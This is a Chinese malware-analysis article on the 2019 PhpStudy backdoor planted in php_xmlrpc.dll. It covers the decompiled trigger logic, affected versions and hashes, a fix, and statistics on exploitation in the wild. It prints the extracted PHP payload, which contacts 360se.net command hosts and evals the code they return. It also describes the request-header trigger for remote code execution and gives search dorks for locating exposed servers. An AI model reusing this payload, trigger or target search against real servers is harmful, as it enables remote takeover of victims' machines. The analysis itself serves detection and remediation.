> 原文链接: https://www.anquanke.com//post/id/187560 


# PhpStudy 后门分析


                                阅读量   
                                **651704**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t01d233a15eecc30ac7.jpg)](https://p1.ssl.qhimg.com/t01d233a15eecc30ac7.jpg)



作者：Hcamael@知道创宇404实验室

## 背景介绍

2019/09/20，一则杭州警方通报打击涉网违法犯罪专项行动战果的新闻出现在我的朋友圈，其中通报了警方发现PhpStudy软件被种入后门后进行的侦查和逮捕了犯罪嫌疑人的事情。用PhpStudy的Web狗还挺多的，曾经我还是Web狗的时候也用过几天，不过因为不习惯就卸了。还记得当初会用PhpStudy的原因是在网上自学一些Web方向的课程时，那些课程中就是使用PhpStudy。在拿到样本后，我就对PhpStudy中的后门进行了一波逆向分析。



## 后门分析

最近关于讲phpstudy的文章很多，不过我只得到一个信息，后门在php_xmlrpc.dll文件中，有关键词：”eval(%s(%s))”。得知这个信息后，就降低了前期的工作难度。可以直接对该dll文件进行逆向分析。

我拿到的是2018 phpstudy的样本: MD5 (php_xmlrpc.dll) = c339482fd2b233fb0a555b629c0ea5d5

对字符串进行搜索，很容易的搜到了函数：sub_100031F0

经过对该函数逆向分析，发现该后门可以分为三种形式：

### 1.触发固定payload：

```
v12 = strcmp(**v34, aCompressGzip);
      if ( !v12 )
      `{`
        v13 = &amp;rce_cmd;
        v14 = (char *)&amp;unk_1000D66C;
        v42 = &amp;rce_cmd;
        v15 = &amp;unk_1000D66C;
        while ( 1 )
        `{`
          if ( *v15 == '\'' )
          `{`
            v13[v12] = '\\';
            v42[v12 + 1] = *v14;
            v12 += 2;
            v15 += 2;
          `}`
          else
          `{`
            v13[v12++] = *v14;
            ++v15;
          `}`
          v14 += 4;
          if ( (signed int)v14 &gt;= (signed int)&amp;unk_1000E5C4 )
            break;
          v13 = v42;
        `}`
        spprintf(&amp;v36, 0, aVSMS, byte_100127B8, Dest);
        spprintf(&amp;v42, 0, aSEvalSS, v36, aGzuncompress, v42);
        v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
        v17 = *(void **)(v16 + 296);
        *(_DWORD *)(v16 + 296) = &amp;v32;
        v40 = v17;
        v18 = setjmp3((int)&amp;v32, 0);
        v19 = v40;
        if ( v18 )
        `{`
          v20 = a3;
          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v40;
        `}`
        else
        `{`
          v20 = a3;
          zend_eval_string(v42, 0, &amp;rce_cmd, a3);
        `}`
        result = 0;
        *(_DWORD *)(*(_DWORD *)(*v20 + 4 * executor_globals_id - 4) + 296) = v19;
        return result;
      `}`
```

从unk_1000D66C到unk_1000E5C4为zlib压缩的payload，后门检查请求头，当满足要求后，会获取压缩后的payload，然后执行@eval(gzuncompress(payload))，把payload解压后再执行，经过提取，该payload为：

```
@ini_set("display_errors","0");
error_reporting(0);
function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123')`{`
 $result = "";
  $handle = stream_socket_client("tcp://`{`$ip`}`:`{`$port`}`", $errno, $errstr,10); 
  if( !$handle )`{`
    $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
 if( !$handle )`{`
  return "err";
 `}`
  `}`
  fwrite($handle, $sendMsg."\n");
 while(!feof($handle))`{`
  stream_set_timeout($handle, 2);
  $result .= fread($handle, 1024);
  $info = stream_get_meta_data($handle);
  if ($info['timed_out']) `{`
    break;
  `}`
  `}`
  fclose($handle); 
  return $result; 
`}`

$ds = array("www","bbs","cms","down","up","file","ftp");
$ps = array("20123","40125","8080","80","53");
$n = false;
do `{`
 $n = false;
 foreach ($ds as $d)`{`
  $b = false;
  foreach ($ps as $p)`{`
   $result = tcpGet($i,$d.".360se.net",$p); 
   if ($result != "err")`{`
    $b =true;
    break;
   `}`
  `}`
  if ($b)break;
 `}`
 $info = explode("&lt;^&gt;",$result);
 if (count($info)==4)`{`
  if (strpos($info[3],"/*Onemore*/") !== false)`{`
   $info[3] = str_replace("/*Onemore*/","",$info[3]);
   $n=true;
  `}`
  @eval(base64_decode($info[3]));
 `}`
`}`while($n);
```

### 2.触发固定的payload2

```
if ( dword_10012AB0 - dword_10012AA0 &gt;= dword_1000D010 &amp;&amp; dword_10012AB0 - dword_10012AA0 &lt; 6000 )
  `{`
    if ( strlen(byte_100127B8) == 0 )
      sub_10004480(byte_100127B8);
    if ( strlen(Dest) == 0 )
      sub_10004380(Dest);
    if ( strlen(byte_100127EC) == 0 )
      sub_100044E0(byte_100127EC);
    v8 = &amp;rce_cmd;
    v9 = asc_1000D028;
    v41 = &amp;rce_cmd;
    v10 = 0;
    v11 = asc_1000D028;
    while ( 1 )
    `{`
      if ( *(_DWORD *)v11 == '\'' )
      `{`
        v8[v10] = 92;
        v41[v10 + 1] = *v9;
        v10 += 2;
        v11 += 8;
      `}`
      else
      `{`
        v8[v10++] = *v9;
        v11 += 4;
      `}`
      v9 += 4;
      if ( (signed int)v9 &gt;= (signed int)&amp;unk_1000D66C )
        break;
      v8 = v41;
    `}`
    spprintf(&amp;v41, 0, aEvalSS, aGzuncompress, v41);
    v22 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
    v23 = *(_DWORD *)(v22 + 296);
    *(_DWORD *)(v22 + 296) = &amp;v31;
    v38 = v23;
    v24 = setjmp3((int)&amp;v31, 0);
    v25 = v38;
    if ( v24 )
    `{`
      v26 = a3;
      *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;
    `}`
    else
    `{`
      v26 = a3;
      zend_eval_string(v41, 0, &amp;rce_cmd, a3);
    `}`
    *(_DWORD *)(*(_DWORD *)(*v26 + 4 * executor_globals_id - 4) + 296) = v25;
    if ( dword_1000D010 &lt; 3600 )
      dword_1000D010 += 3600;
    ftime(&amp;dword_10012AA0);
  `}`
  ftime(&amp;dword_10012AB0);
  if ( dword_10012AA0 &lt; 0 )
    ftime(&amp;dword_10012AA0);
```

当请求头里面不含有Accept-Encoding字段，并且时间戳满足一定条件后，会执行asc_1000D028到unk_1000D66C经过压缩的payload，同第一种情况。

提取后解压得到该payload：

```
@ini_set("display_errors","0");
error_reporting(0);
$h = $_SERVER['HTTP_HOST'];
$p = $_SERVER['SERVER_PORT'];
$fp = fsockopen($h, $p, $errno, $errstr, 5);
if (!$fp) `{`
`}` else `{`
 $out = "GET `{`$_SERVER['SCRIPT_NAME']`}` HTTP/1.1\r\n";
 $out .= "Host: `{`$h`}`\r\n";
 $out .= "Accept-Encoding: compress,gzip\r\n";
 $out .= "Connection: Close\r\n\r\n";

 fwrite($fp, $out);
 fclose($fp);
`}`
```

### 3.RCE远程命令执行

```
ifif  ((  !!strcmpstrcmp((****v34v34,, aGzipDeflate aGzipDefla ) )
    `{`
      if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &amp;v39) != -1
        &amp;&amp; zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &amp;v37) != -1 )
      `{`
        v40 = base64_decode(**v37, strlen((const char *)**v37));
        if ( v40 )
        `{`
          v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
          v5 = *(_DWORD *)(v4 + 296);
          *(_DWORD *)(v4 + 296) = &amp;v30;
          v35 = v5;
          v6 = setjmp3((int)&amp;v30, 0);
          v7 = v35;
          if ( v6 )
            *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
          else
            zend_eval_string(v40, 0, &amp;rce_cmd, a3);
          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
        `}`
      `}`
```

当请求头满足一定条件后，会提取一个请求头字段，进行base64解码，然后zend_eval_string执行解码后的exp。

研究了后门类型后，再来看看什么情况下会进入该函数触发该后门。查询sub_100031F0函数的引用信息发现：

```
data:1000E5D4                 dd 0
.data:1000E5D8                 dd 0
.data:1000E5DC                 dd offset aXmlrpc       ; "xmlrpc"
.data:1000E5E0                 dd offset off_1000B4B0
.data:1000E5E4                 dd offset sub_10001010
.data:1000E5E8                 dd 0
.data:1000E5EC                 dd offset sub_100031F0
.data:1000E5F0                 dd offset sub_10003710
.data:1000E5F4                 dd offset sub_10001160
.data:1000E5F8                 dd offset a051          ; "0.51"
```

该函数存在于一个结构体中，该结构体为_zend_module_entry结构体：

```
//zend_modules.h
struct _zend_module_entry `{`
    unsigned short size; //sizeof(zend_module_entry)
    unsigned int zend_api; //ZEND_MODULE_API_NO
    unsigned char zend_debug; //是否开启debug
    unsigned char zts; //是否开启线程安全
    const struct _zend_ini_entry *ini_entry;
    const struct _zend_module_dep *deps;
    const char *name; //扩展名称，不能重复
    const struct _zend_function_entry *functions; //扩展提供的内部函数列表
    int (*module_startup_func)(INIT_FUNC_ARGS); //扩展初始化回调函数，PHP_MINIT_FUNCTION或ZEND_MINIT_FUNCTION定义的函数
    int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS); //扩展关闭时回调函数
    int (*request_startup_func)(INIT_FUNC_ARGS); //请求开始前回调函数
    int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS); //请求结束时回调函数
    void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS); //php_info展示的扩展信息处理函数
    const char *version; //版本
    ...
    unsigned char type;
    void *handle;
    int module_number; //扩展的唯一编号
    const char *build_id;
`}`;
```

sub_100031F0函数为request_startup_func，该字段表示在请求初始化阶段回调的函数。从这里可以知道，只要php成功加载了存在后门的xmlrpc.dll，那么任何只要构造对应的后门请求头，那么就能触发后门。在Nginx服务器的情况下就算请求一个不存在的路径，也会触发该后门。

由于该后门存在于php的ext扩展中，所以不管是nginx还是apache还是IIS介受影响。

修复方案也很简单，把php的php_xmlrpc.dll替换成无后门的版本，或者现在直接去官网下载，官网现在的版本经检测都不存后门。

虽然又对后门的范围进行了一波研究，发现后门只存在于php-5.4.45和php-5.2.17两个版本中：

```
$ grep "@eval" ./* -r
Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches
```

随后又在第三方网站上([https://www.php.cn/xiazai/gongju/89](https://www.php.cn/xiazai/gongju/89))上下载了phpstudy2016，却发现不存在后门:

```
phpStudy20161103.zip压缩包md5：5bf5f785f027bf0c99cd02692cf7c322
phpStudy20161103.exe   md5码：1a16183868b865d67ebed2fc12e88467
```

之后同事又发了我一份他2018年在官网下载的phpstudy2016，发现同样存在后门，跟2018版的一样，只有两个版本的php存在后门：

```
MD5 (phpStudy20161103_backdoor.exe) = a63ab7adb020a76f34b053db310be2e9
$ grep "@eval" ./* -r
Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches
```

查看发现第三方网站上是于2017-02-13更新的phpstudy2016。



## ZoomEye数据

通过ZoomEye探测phpstudy可以使用以下dork：
1. “Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45” “Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17″ +”X-Powered-By” -&gt; 89,483
1. +”nginx/1.11.5″ +”PHP/5.2.17″ -&gt; 597 总量共计有90,080个目标现在可能会受到PhpStudy后门的影响。
可能受影响的目标全球分布概况：

[![](https://p5.ssl.qhimg.com/t01f91c0203fc72284a.png)](https://p5.ssl.qhimg.com/t01f91c0203fc72284a.png)

[![](https://p3.ssl.qhimg.com/t014832dedf6baabd83.png)](https://p3.ssl.qhimg.com/t014832dedf6baabd83.png)

可能受影响的目标全国分布概况：

[![](https://p2.ssl.qhimg.com/t0170fc789003ecf0b6.png)](https://p2.ssl.qhimg.com/t0170fc789003ecf0b6.png)

[![](https://p0.ssl.qhimg.com/t015f94d3aaac9808e7.png)](https://p0.ssl.qhimg.com/t015f94d3aaac9808e7.png)

毕竟是国产软件，受影响最多的国家还是中国，其次是美国。对美国受影响的目标进行简单的探查发现基本都是属于IDC机房的机器，猜测都是国人在购买的vps上搭建的PhpStudy。



## 知道创宇云防御数据

知道创宇404积极防御团队检测到2019/09/24开始，互联网上有人开始对PhpStudy后门中的RCE进行利用。

2019/09/24攻击总数13320，攻击IP数110，被攻击网站数6570，以下是攻击来源TOP 20:

<th align="right">攻击来源</th><th align="right">攻击次数</th>
|------
<td align="right">*.164.246.149</td><td align="right">2251</td>
<td align="right">*.114.106.254</td><td align="right">1829</td>
<td align="right">*.172.65.173</td><td align="right">1561</td>
<td align="right">*.186.180.236</td><td align="right">1476</td>
<td align="right">*.114.101.79</td><td align="right">1355</td>
<td align="right">*.147.108.202</td><td align="right">1167</td>
<td align="right">*.140.181.28</td><td align="right">726</td>
<td align="right">*.12.203.223</td><td align="right">476</td>
<td align="right">*.12.73.12</td><td align="right">427</td>
<td align="right">*.12.183.161</td><td align="right">297</td>
<td align="right">*.75.78.226</td><td align="right">162</td>
<td align="right">*.12.184.173</td><td align="right">143</td>
<td align="right">*.190.132.114</td><td align="right">130</td>
<td align="right">*.86.46.71</td><td align="right">126</td>
<td align="right">*.174.70.149</td><td align="right">92</td>
<td align="right">*.167.156.78</td><td align="right">91</td>
<td align="right">*.97.179.164</td><td align="right">87</td>
<td align="right">*.95.235.26</td><td align="right">83</td>
<td align="right">*.140.181.120</td><td align="right">80</td>
<td align="right">*.114.105.176</td><td align="right">76</td>

2019/09/25攻击总数45012，攻击IP数187，被攻击网站数10898，以下是攻击来源TOP 20:

<th align="right">攻击来源</th><th align="right">攻击次数</th>
|------
<td align="right">*.114.101.79</td><td align="right">6337</td>
<td align="right">*.241.157.69</td><td align="right">5397</td>
<td align="right">*.186.180.236</td><td align="right">5173</td>
<td align="right">*.186.174.48</td><td align="right">4062</td>
<td align="right">*.37.87.81</td><td align="right">3505</td>
<td align="right">*.232.241.237</td><td align="right">2946</td>
<td align="right">*.114.102.5</td><td align="right">2476</td>
<td align="right">*.162.20.54</td><td align="right">2263</td>
<td align="right">*.157.96.89</td><td align="right">1502</td>
<td align="right">*.40.8.29</td><td align="right">1368</td>
<td align="right">*.94.10.195</td><td align="right">1325</td>
<td align="right">*.186.41.2</td><td align="right">1317</td>
<td align="right">*.114.102.69</td><td align="right">1317</td>
<td align="right">*.114.106.254</td><td align="right">734</td>
<td align="right">*.114.100.144</td><td align="right">413</td>
<td align="right">*.114.107.73</td><td align="right">384</td>
<td align="right">*.91.170.36</td><td align="right">326</td>
<td align="right">*.100.96.67</td><td align="right">185</td>
<td align="right">*.83.189.86</td><td align="right">165</td>
<td align="right">*.21.136.203</td><td align="right">149</td>

攻击源国家分布：

<th align="right">国家</th><th align="right">数量</th>
|------
<td align="right">中国</td><td align="right">34</td>
<td align="right">美国</td><td align="right">1</td>
<td align="right">韩国</td><td align="right">1</td>
<td align="right">德国</td><td align="right">1</td>

省份分布：

<th align="right">省份</th><th align="right">数量</th>
|------
<td align="right">云南</td><td align="right">7</td>
<td align="right">北京</td><td align="right">6</td>
<td align="right">江苏</td><td align="right">6</td>
<td align="right">广东</td><td align="right">4</td>
<td align="right">香港</td><td align="right">4</td>
<td align="right">上海</td><td align="right">2</td>
<td align="right">浙江</td><td align="right">2</td>
<td align="right">重庆</td><td align="right">1</td>
<td align="right">湖北</td><td align="right">1</td>
<td align="right">四川</td><td align="right">1</td>

攻击payload:

[![](https://p2.ssl.qhimg.com/dm/1024_757_/t0154c931f2deb70c02.png)](https://p2.ssl.qhimg.com/dm/1024_757_/t0154c931f2deb70c02.png)

[![](https://p1.ssl.qhimg.com/t012faf99e2dae95c17.jpg)](https://p1.ssl.qhimg.com/t012faf99e2dae95c17.jpg)

本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1044/](https://paper.seebug.org/1044/)
